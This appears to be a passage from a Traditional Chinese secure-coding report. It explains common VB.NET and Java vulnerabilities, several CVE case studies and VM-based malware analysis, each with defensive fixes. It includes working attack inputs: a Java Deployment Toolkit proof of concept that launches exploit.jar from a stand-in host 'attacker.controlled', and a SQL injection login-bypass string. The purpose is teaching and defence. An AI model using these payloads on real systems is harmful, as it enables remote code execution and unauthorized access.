userName + "' AND itemname = '" + ItemName.Text + "'"; 
sda = new SqlDataAdapter(query, conn); 
DataTable dt = new DataTable(); 
sda.Fill(dt); 
... 
以上程式碼建構了一個動態(dynamic)SQL 查詢(query)，該查詢可用來搜尋符
合指定名字的項目(item)。查詢僅會顯示其項目所有者與使用者被授權相符
(currently-authenticated)的項目。 
以上程式碼執行的查詢如下所示： 
SELECT * FROM items 
WHERE owner = <userName> 
AND itemname = <itemName>; 
由於這個查詢是動態的建構，其字串包含基礎查詢字串和輸入字串，所以
 171 
 
... 
Dim ctl As String 
Dim ao As New Worker() 
ctl = Request.Form("ctl") 
If (String.Compare(ctl,"Add") = 0) 
Then ao.DoAddCommand(Request) 
Else If (String.Compare(ctl,"Modify") = 0) 
Then ao.DoModifyCommand(Request) 
Else 
App.EventLog("No Action Found", 4) 
End If 
... 
程式設計者通常使用反映(reflection)來執行命令發送器(dispatch)。以上程式
顯示未使用反映功能的命令發送器。 
程式碼修改為以下內容，以使用反映功能： 
... 
Dim ctl As String 
Dim ao As New Worker() 
ctl = Request.Form("ctl") 
CallByName(ao, ctl, vbMethod, Request) 
... 
修改程式提供下列好處，程式行數較少(if/else 區塊完全刪除)，且現在可於
不修改命令發送器而增加新的命令類型。 
此修改方式會讓攻擊者呼叫所有由 Worker 物件執行的方法。如果命令發送
器負責存取控制，則程式設計師在 Worker 類別內建立新方法，都必頇修改發送
器的存取控制邏輯。如果此存取控制邏輯已經過時(stale)，部份的 Worker 方法
將不會擁有任何存取控制。 
處理存取控制問題的其中一個方法，就是讓 Worker 物件負責執行存取控制
 173 
 
 
4.1.18 API Abuse (VB.NET) 
I. Code Correctness: Class Does Not Implement Equals 
未實作 equals()物件，卻呼叫 equals()。 
當比較物件時，程式設計者通常會比較物件的特性。但在未明確實作
(implement)equals()的類別上呼叫 equals()，會造成對繼承自 java.lang.Object 的
equals()方法之呼叫。Object.equals()會比較兩個物件實例(instance)來確認物件是
否相同，而不是比較物件成員欄位(field)或其他特性。 
public class AccountGroup{ 
private int gid; 
public int Gid{ 
get { return gid; } 
set { gid = value; } 
} 
} 
... 
public class CompareGroup{ 
public bool compareGroups(AccountGroup group1, 
AccountGroup group2){ 
return group1.Equals(group2); 
//Equals() is not implemented in AccountGroup 
} 
} 
以上程式如上段所敘，雖然合法的使用 Object.equals()，但是這通常表示程
式錯誤。 
對於其解決方法，針對程式設計者在撰寫程式時，每個物件之實作，必頇
確認已做到方能使用。 
 175 
 
在只有小量資料可用之情形下，不會被考慮成不尋常的。此類別只有將這些小
量的資料加入回傳緩衝區，並且把回傳值設為讀取的位元組或字元數。因此，
並不能保證回傳的資料量等於要求的資料量。 
如此程式設計者必頇檢查從 read()的回傳值以及其他 IO 方法，並確保他們
能夠接收到預期的資料數量。 
char[] byteArray = new char[1024]; 
for (IEnumerator i=users.GetEnumerator(); 
i.MoveNext() ;i.Current()) { 
string userName = (string) i.Current(); 
string pFileName = PFILE_ROOT + "/" + userName; 
StreamReader sr = new StreamReader(pFileName); 
sr.Read(byteArray,0,1024); 
//the file is always 1k bytes 
sr.Close(); 
processPFile(userName, byteArray); 
} 
以上程式碼使用 for 迴圈，在一群使用者中讀取每個使用者的 pFileName。
程式設計者假設讀取之檔案的大小始終為 1024 bytes，因而忽略了 read()的回傳
值。若攻擊者可以建立比 1024 bytes 小的檔案，那麼程式會讀取到前一個使用
者加上攻擊者共 1024 bytes 的資料，並將這些資料當作攻擊者的所有物來處理。 
故其處理方法是必頇檢查其回傳值。不管程式設計者多麼確定此 system.io 之執
行不會有錯誤，但往往錯誤就藏在程式設計者想不到之處，故按部就班便是最
好之解決方法。 
  
 177 
 
相對應之資料，否則予以拒絕。 
 
II. Cookie Security: HTTPOnly not Set 
此種漏洞發生在以下情形，程式創造一個 cookie，但是並未將其 HttpOnly
的旗標設為真(true)。 
微軟之瀏覽器(Microsoft Internet Explorer)支援防止用戶端(client-side)腳本
(script)存取 cookie 的 HttpOnly cookie 特性。Cross-Site Scripting 攻擊通常會存取
cookie，嘗詴竊取 session 識別碼或 Authentication 標記(token)。未啟用 HttpOnly
時，攻擊者可更輕易存取使用者 cookie。 
HttpCookie cookie = new HttpCookie("emailCookie", email); 
Response.AppendCookie(cookie); 
以上程式中的程式碼會建立 cookie，而不設定 HttpOnly 特性。 
故在其解決方法中，頇針對程式設計者，其程式設計者頇謹記在創造一個
cookie 時，必定將 HttpOnly 設定為真。 
 
III. Insecure Randomness 
標準的虛擬隨機數字產生器(pseudo-random number generator)，通常不能抵
抗加密攻擊(cryptographic attack)。 
於安全性敏感之環境中，將能產生可預測(predictable)數值之函數當作亂數
來源使用時，會產生 Insecure Randomness 錯誤。 
電腦是種決定性(deterministic)的機器，故不可能產生真正的隨機性。虛擬
隨機數字產生器(PRNG)近似於隨機演算，會從一個可以計算後續(subsequence)
 179 
 
更安全。 
 
IV. Password Management 
以純文字的方式儲存一個密碼，會導致可能危害到一個系統。 
密碼管理的問題會發生在以下情形，當密碼以純文字的方式儲存於應用程
式的配置檔案或其他的資料儲存系統中。 
... 
string password = regKey.GetValue(passKey).ToString()); 
NetworkCredential netCred = new 
NetworkCredential(username,password,domain); 
... 
以上程式碼中，從登入中讀取一個密碼，並且利用此密碼去創立一個新的
網路憑證。 
這些程式在執行時並不會有任何錯誤，但是只要有任何人能夠存取用來儲
存密碼的登入序鑰，都能讀取到 password 的值。如果有一個懷有惡意的員工可
以存取到此資訊的話，則此員工便可以利用此資訊來破壞整個系統。 
系統最重要便是其安全性以及其可靠性，若隨意將可以存取此系統的重要
帳號以及密碼以純文字的方式儲存於配置檔案中，便會對系統造成重大的安全
危害，不幸的是，這便是程式設計者最喜歡使用來撰寫密碼管理程式的方式，
所以其解決方法針對程式設計者，在撰寫其密碼系統時，可以使用資料庫來儲
存其帳號、密碼以及相關重要的敏感資料，如此的話，若懷有惡意的員工想要
知道此密碼，必頇還要先經過資料庫這道關卡，以增加系統之可靠性。 
 
 181 
 
號為基礎來產生的話，則學號就應該被視為一個隱私資料。 
安全與隱私的考量通常都會互相矛盾，以安全的觀點來說的話，應該記錄
所有重要的執行工作，如此的話，任何有異常的行為都能隨後馬上被確認。但
是，若隱私的資料也儲存於記錄的話，這樣的行為可能會產生很大的風險。 
雖然有很多方法會將隱私資料以不安全的方法處理，但是普遍的風險是源
自於不適當的信任，程式設計者通常會信任程式執行的作業環境，而且相信此
作業環境很適合將隱私資訊儲存於檔案系統、登入檔或是其他局部控制的資源
中。即使已經限制存取重要的相關資源，這仍不保證有存取權限的人可以完全
信任。例如，在 2004 年一個 AOL 沒有道德的員工，將大約九千兩百萬的客戶私
人電子信箱地址販賣給賭博網站的垃圾郵件發送者(spammer)。 
對於利用此種類型攻擊的反應，造成隱私資料的收集以及管理變得越來越
受規範， 
對於隱私資訊的處理，因為通訊傳輸系統的進步而越來越受重視，也因為網路
應用系統的普遍，讓個人的隱私資料也越來越重要，若沒有完整的處理隱私資
料的話，可能造成系統內個人資訊被竊取，甚至造成此系統之公司龐大的損失。
所以對於其解決方法應該針對程式設計者以及使用者。程式設計者在撰寫程式
時，對於隱私資料之處理應該要與其他漏洞一起考慮，例如不要讓使用者之隱
私資料進入程式，以防有 Private Violation 之漏洞，可以儲存於資料庫，但必頇
防止 SQL Injection 此種漏洞，當要以隱私資訊來當標籤來存取某物件時，可以用
個亂數產生且系統能辨識之變數來當作標籤，但必頇考慮 Weak Encryption 的漏
 183 
 
4.1.20 Time and State (VB.NET) 
I. ASP .NET Bad Practices: Non-serializable Object Stored in Session 
儲存一個不可序列化的物件當作一個 HttpSessionState 特性，會危害到應用
程式的可靠性(reliability)。 
藉由預設的值可知，ASP.NET 伺服器會儲存 HttpSessionState 此物件、以及
特性與任何物件其被參照於記憶體中。此模型會限制作用中的 session 狀態為單
一機器的系統記憶體來提供。為了擴展容量其限制，伺服器被頻繁的配置來維
持 session 狀態資訊，如此的話，不僅擴充其容量，還允許可在多台機器上複製
以提升整體的效能。為了要維持其 session 狀態，伺服器必頇序列化
HttpSessionState 物件，此需要其所有儲存的物件皆為可序列化的。 
為了使 session 能夠正確序列化，應用程式中所有儲存為 session 特性的物件
必頇宣告為有 Serializable 屬性。除此之外，如果物件要求自行定義的序列化方
法，它還必頇執行 ISerializable 介面。 
public class DataGlob{ 
String GlobName; 
String GlobValue; 
public void AddToSession(HttpSessionState session){ 
    session["glob"] = this; 
} 
} 
以上程式碼為一個類別(class)，將自身增加到 session 內，但是由於其為不
可序列化，故此 session 就不能正確的序列化。 
其相關解決方使是針對程式設計者在撰寫程式時，必頇只能將可序列化之對象
 185 
 
4.1.21 Errors (VB.NET) 
I. Poor Error Handling: Empty Catch Block 
忽略一例外(exception)會導致程式忽略意料外的狀態與情形。 
對於在軟體系統上每個嚴重的攻擊，都是從侵害程式設計者的假設開始。
在攻擊之後，程式設計者的假設似乎是劣質與脆弱的基礎，但是在攻擊之前，
許多程式設計者都會為他們定義的假設做討論。 
兩個不可靠的假設很容易在程式碼中被發現，其一是這個方法的呼叫永遠
都不會失敗，其二是如果這個方法的呼叫失敗也不會有影響。當一個程式設計
者忽略一個例外的話，表示明確的說明他們已經處於以上兩種假設之中。 
try { 
    doExchange(); 
} 
catch (RareException e) { 
    // this can never happen 
} 
以上程式碼片段為 try and catch，其忽略了一個從 doExchange()罕見拋出的
例外。 
若拋出了一個 RareException 的例外，程式將會因為 catch 內沒有撰寫任何
的程式而繼續執行，且這個程式將不會記錄任何發生此特別情形的證明，而之
後想要利用此來解釋程式設計者欲設計之程式，將會變得非常困難。 
針對此漏洞的解決方法中，當程式設計者在撰寫程式時，在 try 中設定可能
出現例外的程式，但是當 catch 抓取到例外時，必頇要有相對應的解決措施，否
 187 
 
} 
以上程式會由 k 引發例外，所以會跳到 Outside 的 catch 中，故顯示出 Outside
後便結束程式的執行。 
try{ 
try{ 
    int a = 0; 
    int b = 10 / a; 
} 
catch(Exception ex){ 
    MessageBox.Show("Inside"); 
} 
int i = 0; 
int k = 10 / i; 
} 
catch(Exception ex){ 
MessageBox.Show("Outside"); 
} 
以上會先由 b 引發例外，故會跳到 Inside 的 catch 中，在顯示出 Inside 後程
式會繼續執行，並接著游 k 再次引發例外，並跳到 Outside 的 catch 內，在顯示
Outside 後程式便結束執行。 
private void button1_Click(object sender, EventArgs e){ 
try{ 
    func(); 
} 
catch(Exception ex){ 
    MessageBox.Show("From click"); 
} 
} 
private void func(){ 
int i = 0; 
int k = 10 / i; 
} 
以上為在 try 中測詴函式的方法，若被呼叫的函式 func()發生錯誤，且並沒
 189 
 
} 
以上程式碼，若發生 SqlException 相關的例外，則會執行 Code Section 1 的程式，
否則發生其他例外的話，將會執行 Code Section 2 的程式碼。以上程式中，指明
發生的例外可以減少到共同例外去找出此例外，因而可以增加程式執行的效
能。 
  
 191 
 
其二是不明確程式中的哪一個部分為負責釋放資源之管理。 
大部分 Unreleased Resource 的事件會導致一般軟體可靠性的問題，如果一
個攻擊者故意觸發一個 resource leak(即是某片段程式碼不斷要求資源，但使用
完後並沒有釋放此資源，造成資源的可用性降低)，則攻擊者便可能藉由耗盡資
源來產生一個 denial of service 的攻擊。 
Object synchronizationObject = new Object (); 
System.Threading.Monitor.Enter(synchronizationObject); 
performOperationInCriticalSection(); 
System.Threading.Monitor.Exit(synchronizationObject); 
以上程式碼在 performOperationInCriticalSection()之前建立了一個鎖定的機
制，但是若 performOperationInCriticalSection()發生了例外，則程式便不會釋放剛
才的鎖定。 
其解決之方法，針對程式設計者在撰寫程式時，必頇注意對於 Critical Section 的
設計，若設計了一個鎖定的機制，必要能確定其釋放的機制在某些條件下一定
會執行到，否則可能會失去對於此資源再使用的權力，造成系統越來越大的負
荷，直到系統當機為止。 
  
 193 
 
則可能會遭受攻擊者的觀看這些資訊，進而策劃攻擊此應用程式之方法。 
II. Trust Boundary Violation 
在相同的資料結構中，混淆可信任以及不可信任的資料，可能會導致程式
設計者誤用未經驗證的資料。 
Trust Boundary 可以被想像成程式中的一條線，在線的一邊是可信任的資料，
而在現的另一邊則被認定是不可信任的資料，而邏輯認證的目的便是讓不可信
任的資料可以安全的跨越 Trust Boundary 進入可信任的區域。 
Trust Boundary Violation 發生於當程式設計者將 Trust Boundary 混淆而分不
清哪邊是可信任的資料哪邊是不可信任的資料。而造成此種情形的最大原因是
程式設計者將可信任的資料與不可信任的資料混淆。 
usrname = request.Item("usrname"); 
if (session.Item(ATTR_USR) == null){ 
session.Add(ATTR_USR, usrname); 
} 
以上程式碼接受一個 HTTP 的請求，並且在未檢查此使用者是否經過驗證，
便將 username 參數儲存於 HTTP session 中。 
若沒有良好的建立以及維持 Trust Boundary，程式設計者將會不可避免的對
於哪些資料是可信賴的哪些是不可信賴的形成模糊，此種混淆將會造成資料未
經第一次的驗證便被使用。 
此種漏洞的解決方法便是要針對程式設計者使用的資料結構，程式設計者在創
建存放資料的資料結構時，必頇要針對此資料是否經過驗證來存放，經過驗證
之資料放一個資料結構，未經過驗證之資料放一個資料結構，而經驗證之資料
 195 
 
4.1.24 Environment (VB.NET) 
I. Password Management: Password in Configuration File 
以純文字(plaintext)儲存一個密碼於配置(configuration)檔案中，可能會導致
一個系統陷入危險之中。 
以純文字的方式，將密碼儲存於配置檔中，將會允許任何可以讀取此配置
檔的人，可以存取密碼保護的資源。開發人員有時候會相信他們不用讓應用程
式去防備可以存取配置檔之人，但是如此的話，只會讓攻擊者更容易攻擊此系
統。好的密碼管理指導原則(guideline)是絕不能以純文字的方式記錄密碼。 
<configuration> 
<appSettings /> 
<connectionStrings> 
<add name = "ConnectString" connectionString = "Data 
Source=Server8; Persist Security Info=True; User ID=sa; 
Password=123" providerName = "System.Data.SqlClient"/> 
</connectionStrings> 
</configuration> 
以上程式碼，將程式之帳號密碼以純文字之方式，儲存於配置檔案中。 
其解決方法針對在撰寫程式，當程式設計者在撰寫程式時，絕不能一時之
方便，而將帳號密碼撰寫於配置檔案中，如此的話，只要有權力能夠存取配置
檔之人，就能很輕易的危害到此系統，造成系統安全之不可靠性。 
以上七加一個類別內對於漏洞之討論，皆是現今於程式安全上非常重要的
議題，且其中解析之漏洞，都是軟體市場上的應用程式或系統容易忽略之漏洞，
因而常常遭受攻擊。 
 197 
 
 資訊安全漏洞分類統計 
National Vulnerability Database(NVD)是美國國家標準與科技機構(National 
Institute of Standards and Technology, NIST)底下的資訊安全漏洞統計資料庫，收
集各個安全漏洞研究機構回報的資安漏洞進行統計與分析，根據其提供的數據，
目前每天至少發現數十個新的安全漏洞。下表為每年新增安全漏洞數量： 
年份 *1994 1995 1996 1997 1998 1999 2000 2001 2002 
安全漏洞數量 82 25 75 252 246 894 1020 1677 2156 
*註：1993 年以前累計 
表格 4-14 每年新增安全漏洞數量 
年份 2003 2004 2005 2006 2007 2008 2009 2010 Total 
安全漏洞數量 1527 2451 4932 6608 6514 5632 5733 4146 43970 
 
由表中可知 2000 年後資安漏洞被發現的數量大幅提升，且每年均檢出數千
筆漏洞，其中也統計、分類出較具明顯危險性的漏洞，共 15001 項。這些資訊
安全漏洞的分類情形如下表： 
表格 4-15 資安漏洞統計分類 
資安漏洞分類 數量(09’/10’) 百分比(%)(09’/10’) 
Authentication Issues 441 474 2.94%  2.35% 
Buffer Errors 1644 2239 10.96% 11.12% 
Code Injection 992 1300 6.61% 6.46% 
Configuration 152 180 1.01% 0.89% 
Credential Managements 162 224 1.08% 1.11% 
Cross-Site Request Forgery(CSRF) 211 301 1.41% 1.50% 
Cross-site scripting (XSS) 1929 2619 12.86% 13.01% 
Cryptographic Issues 173 245 1.15% 1.22% 
Design Error 418 499 2.79% 2.48% 
Format String Vulnerability 83 99 0.55% 0.49% 
 199 
 
4.1.25 FCKeditor.Java 2.4 Denial of Service (Java) 
FCKeditor.java 是一套以 Java 撰寫的函式庫，提供使用者方便使用的開發介
面，以快速撰寫、開發、並部署以 JSP scriptlet 或 JavaScript 為基礎的網頁軟體。
在 2.4.2 版以前的 FCKeditor.java 被發現具有 denial of service 漏洞，當使用者輸
入特定輸入資料時，會導致開發之程式進入無窮迴圈，進而造成開發之軟體無
法提供正常服務。 
Denial of service 發生原因為未檢查某個從網頁讀入的使用者輸入，使攻擊
可可輸入字串中包含 ctrl 鍵的 ASCII code，使程式進入無窮迴圈。相關原始碼及
說明如下： 
public static boolean isValidPath(final String path) { 
    if (Utils.isEmpty(path)) 
        return false; 
    if (!path.startsWith("/")) 
        return false; 
    if (!path.endsWith("/")) 
        return false; 
  
    if 
(!path.equals(FilenameUtils.separatorsToUnix(FilenameUtils 
   .normalize(path)))) 
        return false; 
  
    return true; 
} 
此方法 (isValidPath) 目的為過濾不合法的外部輸入字串，但此方法只有防
止基本 path manipulation 的檢查 (如 if(!path.startsWith(“/”)))，因此當輸入字串包
含 ctrl 時並未能被此函式過濾。在 2.4.2 版本的更新 patch 如下： 
 201 
 
4.1.26 Java Development Toolkit Command Injection 
(Java) 
自 Java 6 Update 10 版本開始，Sun 發佈了 NPAPI plugin 與 ActiveX control 
“Java Development Toolkit”。Java Deployment Toolkit 是 Java 為了方便開發人員
透過網路，將其應用程式安裝到使用者的電腦上，以及簡化日後維護程序而提
供的一個開發套件，使用者可藉由 Java Networking Launch Protocol (JNLP)機制
從網路安裝軟體，在Windows系統中，控制此機制的程式為 Java Web Start utility，
javaws.exe。 
javaws.exe 中的 launch()方法接受 URL 字串，過濾後再將其傳至已註冊之
JNLP file handler，但其過濾輸入能力不足，使用者可傳送特定字串，使 javaws.exe
執行遠端的任意 JAR file，造成command injection攻擊產生。例如 Internet Explorer
使用者可執行下列 code sequence： 
var o = document.createElement("OBJECT"); 
 
o.classid = 
"clsid:CAFEEFAC-DEC7-0000-0000-ABCDEFFEDCBA"; 
 
o.launch("http: -J-jar -J\\\\attacker.controlled\\exploit.jar 
none"); 
Mozilla Firefox 的攻擊範例如下： 
var o = document.createElement("OBJECT"); 
 
o.type = 
"application/npruntime-scriptable-plugin;deploymenttoolkit" 
 
 203 
 
                // Old type 
                o.launch(u); 
            } catch (e) { 
                // New type 
                n.launch(u); 
            } 
        } 
 
        // Bonus Vulnerability, why not downgrade victim to a JRE 
vulnerable to 
        // this classic exploit? 
        // 
http://sunsolve.sun.com/search/document.do?assetkey=1-66-244991-1 
 
        // o.installJRE("1.4.2_18"); 
</script> 
</body> 
</html> 
圖表 4-41 錯誤顯示圖 
 
Java 6 Update 20 (java se 1.6.0_20 update) 之後版本修正了此一安全漏洞。由
此可知，由於 JRE 實作的不同，Java virtual machine 也擁有許多安全議題頇多加
注意。 
  
 205 
 
則兩 MAC 會不相同，反之，相同時代表資訊無誤。即便惡意攻擊者為了篡改訊
息而任意的做大量猜測運算，MAC 機制亦能有效防止。 
  
 207 
 
更新 patch file 如下： 
public void addUser( Socket sock ) 
{       
    User usr = new User(sock, this); 
    String usrName = usr.getName(); 
if (usrName != "" ) 
    { 
        /* start fix */ 
        /* manage NullPointerException */ 
        try 
{ 
     if (userHash.containsKey( usrName) ) 
            { 
                usr.rejectUsername(); 
                return; 
            } 
        }catch(NullPointerException npe){ 
            usr.rejectUsername(); 
            return; 
        } 
} 
} 
由此漏洞我們可知，即使是簡單的 NullPointerException 偵測機制，也可能
造成安全漏洞產生，Java 相對於 C++而言，在程式層級中提供了完整的例外處
理機制，善用例外處理機制可主動避免產生許多潛在安全漏洞產生。 
  
 209 
 
                     .toString().equals(encodingName)) { 
                     
inputBuffer.addActiveFilter(inputFilters[i]); 
持續追蹤有多少 filters 在 filter library 裡，當檢查到可插入指令的 filter 時，
就將其跳過。由此案例與前幾個案例，可看出輸入資料驗證與 Denial of Service
漏洞的高度相關性。 
  
 211 
 
if (add) { 
// Finish adding new package by adding it and updating 
shared  
// user preferences 
   insertPackageSettingLP(p, name, sharedUser); 
} 
} 
原先的程式架構，就算安裝過程中有錯誤也可以讓安裝程序進行下去。但
因為沒有安裝完整，而稱之為 half-installed。當程式判斷此次的安裝為
half-installed時，就會 split getPackageLP()成 2個phase，第一個phase會產生 record，
第二個 phase 將第一個 phase 產生的資料真正的寫入 data structure 中。因為只有
在第二個 phase 才能將 sharedUserId 寫入 PackageSetting data structure，所以在寫
入之前並不知道實際上在第一個 phase 時，資料有沒有產生。 
解決的方法為，在產生 PackageSetting structure 時，就直接設定好
sharedUserId 並且驗證它。 
  
 213 
 
 } else if (e instanceof DataBackendException) { 
   cause = "Could not connect to user database: " + 
e.getMessage(); 
} else { 
    cause = "Fatal Error : " + e.getMessage(); 
} 
 data.setMessage("Login failed. Cause: " + cause); 
Patch 後程式碼： 
if (e instanceof StorageException){ 
cause = "Error in communicating with authentication 
server: " + e.getMessage(); 
 } else if (e instanceof PasswordMismatchException) { 
   cause = "Wrong password entered for username: " + 
username; 
} else if (e instanceof UnknownEntityException) { 
   cause = "Unknown username: " + username; 
 } else if (e instanceof NoSuchElementException) { 
    cause = "Unknown username: " + username; 
 } else if (e instanceof DataBackendException) { 
   cause = "Could not connect to user database: " + 
e.getMessage(); 
} else { 
  cause = "Fatal Error : " + 
StringEscapeUtils.escapeHtml(e.getMessage()); 
} 
data.setMessage("Login failed. Cause: " + 
StringEscapeUtils.escapeHtml(cause)); 
程式碼說明： 
使用者登入失敗時，系統將會產生例外情形，系統獲得例外情形後，將例
外的敘述儲存連同 username 參數儲存在 cause 參數中，然後將 cause 參數資料回
傳到客戶端，使使用者得知登入失敗原因。 
注意到原始版本的程式碼，程式將例外敘述及 username 儲存在 cause 變數
 215 
 
4.1.32 Directory traversal vulnerability of Tomcat 6.0 
(Java) 
CVE-2009-2693 指出有一個 directory traversal 漏洞存在於 apache tomcat 6.0
中，使惡意使用者可利用 rar 檔案覆蓋伺服器的特定檔案。 
原始 Tomcat 6 在解壓縮 rar 檔案時沒有檢察 rar 解壓縮的路徑是否正確，使
得惡意使用者可以製作一個 rar檔案包含“..”(表上一層目錄)及欲覆蓋的惡意檔案，
舉例來說若有系統目錄結構如下: 
\www_root 
\rar_decompress 
\config 
  Server.conf 
若惡意使用者欲修改 server.conf 則可以上傳一 rar 檔案包含以下目錄結構: 
\. 
   \.. 
     Server.conf 
就能達到修改 server.conf。 
在 patch file 中 tomcat 加入了以下敘述，達到檢查 rar 解壓縮路徑是否正確: 
try { 
     if (!resourceFile.getCanonicalPath().startsWith( 
             canonicalLoaderDir)) { 
       throw new IllegalArgumentException( 
sm.getString("webappClassLoader.illegalJarPath
", 
         jarEntry2.getName())); 
} 
 } catch (IOException ioe) { 
   throw new IllegalArgumentException( 
sm.getString("webappClassLoader.validationErrorJarPat
 217 
 
4.1.33 Java CMM readMabCurveData stack overflow 
(Java) 
軟體功能簡介： 
    Java SE Runtime Environment( JRE )，通常都叫做 JRE，它是運行基於
Java 語言編寫的程序所不可缺少的運行環境。也是透過它，Java 的開發者才得
以將自己開發的程序發佈到使用者手中，讓使用者使用。 
JRE 中包涵了 Java Virtual Machine( JVM )、runtime class libraries 和 Java 
application launcher，這些是運行 Java 程序的必要組件。 
而 JRE 與大家所熟知的 JDK 不同，JRE 並不是一個開發環境，所以沒有包
涵任何開發工具( 如編譯器等等 )，只是針對於用 Java 程序的使用者。 
安全漏洞原因：Stack overflow 
攻擊者若是成功的突破安全漏洞，則可以在有安全漏洞的程式上執行任意
的程式碼或是導致 denial-of-service conditional. 
其主要的安全漏洞原因在於 CMM 模組中的 readMabCurveData 函式。 
在 path \j2se\src\share\native\sun\awt 中有一個 cmm 資料夾。而在這個 path
下搜尋 readMabCurveData，會發現只有唯一一個檔案： 
\j2se\src\share\native\sun\awt\cmm\iomf.c. 
以下是有安全漏洞的一部分的 native code： 
 219 
 
圖表 4-43 產生 Stack overflow 之程式碼 
 
而在上面的 code 中我們會發現([ebp-14])被複製到 EAX register 中，而在之
後，他的數值會被乘以兩倍且被當成 Kp_read 函式的 size 參數。在這時候，我
們對於傳遞的參數無法控制且可能會導致 corrupt memory： 
圖表 4-44 產生 Corrupt memory 之程式碼 
 
 
Fixed patch： 
以下這些便是沒有此一安全漏洞的版本，亦即這些版本已經將此一安全漏
洞解決了。 
Sun JRE (Windows Production Release) 1.6.0_19 
 221 
 
4.1.34 Ad Server Solutions Affiliate Software Java 4.0 
SQL Injection (Java) 
Ad Server Solutions Affiliate Software Java 4.0 中的 logon.jsp 所產生的 SQL 
injection 有可能使得惡意使用者透過(1)Username and (2)password 來執行任意的
SQL commands。 
原始碼範例如下： 
Connection conn ; 
Statement stmt ; 
String strUsername ; 
String strPassword; 
String StrSql; 
ResultSet rs; 
Boolean login; 
 
conn= pool.getConnection( ); 
stmt=conn.createStatement(); 
StrSql = "SELECT * FROM members WHERE name='"+ 
strUsername+"'AND pwd='"+strPassword+"'"; 
rs = stmt.executeQuery(StrSql); 
 
if (rs.next()) { 
        login = true; 
out.println("Login Successed!"); 
}  
 
else { 
        login = false; 
out.println("Wrong ID or password!"); 
    } 
攻擊者在 Username 這個欄位輸入 "admin' OR '1'='1"，這時候系統會將它和
上面的程式碼作結合，會產生： StrSql = SELECT * FROM members where 
 223 
 
以下將列舉數個 VB.NET 資安漏洞範例，分析漏洞之發生原因、位置，漏
洞可能造成的攻擊，藉此使程式設計者了解資安漏洞發生特性，在程式開發階
段能主動避免，也能了解其對程式開發造成的影響。 
4.1.35 Microsoft VBE6.dll Stack Memory Corruption 
(VB.NET) 
VBE6.dll 是 Microsoft Visual Basic Application (VBA) SDK 的重要函式庫，
在 VBA SDK 6.3 至 6.5 版被發現此函式庫提供之函式未檢查嵌於文件檔案的
ActiveX 控制項，如主應用程式開啟並傳送蓄意製作的檔案給 VBA Runtime，此
漏洞可能允許從遠端執行程式碼，如使用者以系統管理權限登入，攻擊者可以
取得受影響系統的完整控制權。受影響的軟體有：Microsoft Office XP SP3、Office 
2003 SP3、2007 Microsoft Office System SP1,2、VBA SDK 6.3~6.5 版。 
此安全漏洞於 2010 年五月被發現，但存在時間已久，且影響範圍頗大，由
此可知潛藏的安全漏洞可能性不低，且被發現的時間不固定，顯示持續安全驗
證對於軟體開發的重要性。 
  
 225 
 
的更新檔，便可完全解防止漏洞被攻擊者利用。 
  
 227 
 
著名的軟體，將會因為此漏洞而造成執行某個惡意程式碼，造成系統損壞。 
對於此影響層面非常廣大的漏洞，Microsoft 在 2008 年的 12 月，發表了一
份更新檔，可以完全修正此漏洞，避免因為此漏洞而造成系統的攻擊。 
  
 229 
 
4.1.39 Microsoft Visual Basic T-SQL Object Buffer 
Overflow (VB.NET) 
在 Microsoft 的 Visual basic T-SQL object(vbsdicli.exe)上，因為對於底層架構
的設計不良，而可能在程式中產生 Buffer overflow 此種漏洞，若攻擊者針對此
漏洞攻擊，會導致攻擊者可執行任意程式。 
Microsoft Visual Basic 的 T-SQL debugger object 與擁有一個未驗證之緩衝區
的 Visual Basic 6.0 Enterprise Edition 一起傳送，此 object 的 method 會在緩衝區
儲存參數，而此 object 可被遠端存取，如果此 object 被某個程式引用，而此程式
在此參數中有惡意資料或過長的資料，將可能導致此 object 在主機端不能使用，
甚至利用此 Buffer overflow 來執行任意程式碼。 
這是 VB 的一個 object 與 Visual Basic 6.0 Enterprise Edition 一起傳送造成的
Buffer overflow，而安裝 VB 時此 object 被設為預設安裝，故容易發生於一般使
用者。 
此漏洞因為Visual basic的T-SQL object(vbsdicli.exe)設計不良，故對於Visual 
basic 為主要之影響。 
針對此漏洞之解決方法，因為此漏洞於 2003 年 6 月發布，Microsoft 提供了
更新檔，當使用者安裝此更新檔，便可避免此漏洞。 
 
 231 
 
在虛擬機器內執行目標程式有以下幾點好處︰首先，目標程式與真實機器有較
好的隔離性，不至於在分析時令惡意程式入侵至真實系統，降低分析準確性甚
至對系統造成破壞。其次，由於虛擬機器對外部的真實系統來說只是單一的程
序，其 CPU、記憶體與硬碟狀態都十分容易取得並進行分析。 
由於使用虛擬機器來分析惡意程式的有效性極高，因此這種手法成為分析
人員常用的技術之一，也因此有惡意程式開始會對其所在的執行環境進行檢查，
確定並不是在虛擬環境下後才執行自身的惡意行為。對於這一點我們分析如
下︰首先，使用虛擬技術來分析惡意程式乃當今最重要的技術之一，儘管有部
份惡意程式開始進行虛擬環境的偵測，鑑識人員也不應立即放棄此種有效的分
析手法。其次惡意程式在進行虛擬環境的偵測時，往往只做非常簡單的特徵比
對，由於虛擬軟體的多樣性，這種作法讓以往讓偵測軟體失效的「特徵碼不足」
問題，從偵測軟體開發人員移至惡意程式作者身上，提高惡意程式的寫作難度。
最後，由於我們可以完全掌握虛擬出的環境，因此要改變虛擬環境的特徵以躲
避惡意程式的偵測非常容易。在今年的研究中，我們將先專注於使用虛擬環境
的分析偵測技術開發，對於以上所提問題我們將預計於未來再進行更深入的研
究。 
使用以上的觀點進行研究，所需進行的分析流程大致可以下圖表示。透過
下圖所示的流程若能發現某項資訊的不一致，則可判定為某種匿蹤行為。 
 
 233 
 
統內部進行，則有可能受到 Rootkit 行為的干擾導致找不出變動的地方，因此一
樣必頇從系統外部進行解析。整體流程如下圖： 
 
其中一困難點在於如何從虛擬機器外部解析出真實的資訊。從機器外部看
到的資訊，缺乏系統內部對資料進行解析的抽象意義，例如從外部觀察該虛擬
機器的磁碟映像檔，所看到不是檔案與目錄結構，而是一塊塊磁區的資料。同
理，由外部觀察虛擬機器的記憶體狀態，也無法看到程序的虛擬位址空間，而
是一大塊的物理層記憶體。 
要從記憶體中取出有用的資訊，其中一項有力的技術為，辨認記憶體中的
資料結構。在 Windows 核心中，各種資料皆以 Kernel Object 的方式存在，並在
不同的函式或部件中傳遞，以執行緒為例，要讓 Windows 在進行 Context Switch
時分配時間給某一執行緒，則該執行緒必頇要有一_ETHREAD 的資料結構在等
候 Context Switch 的連結串列中，而這個資料結構中的許多欄位，其值可能永遠
為常數或固定範圍，因此我們可以透過這特徵辨識出這些資料結構，以得到最
